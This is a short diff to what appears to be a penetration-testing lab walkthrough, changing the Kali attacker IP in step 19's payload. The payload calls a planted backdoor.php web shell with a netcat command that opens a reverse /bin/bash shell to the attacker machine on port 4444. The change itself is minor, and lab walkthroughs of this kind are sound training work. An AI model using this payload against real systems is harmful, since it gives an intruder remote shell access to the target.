@@ -144,7 +144,7 @@ Tools:
 
 19. Make Target2 call the Kali Linux machine with the NetCat command embedded in the next payload after running it in the browser.
 
-        192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash
+        192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 4444 -e /bin/bash
 
     **Change the second IP address in the payload to the IP address of your own kali Linux machine.**
 
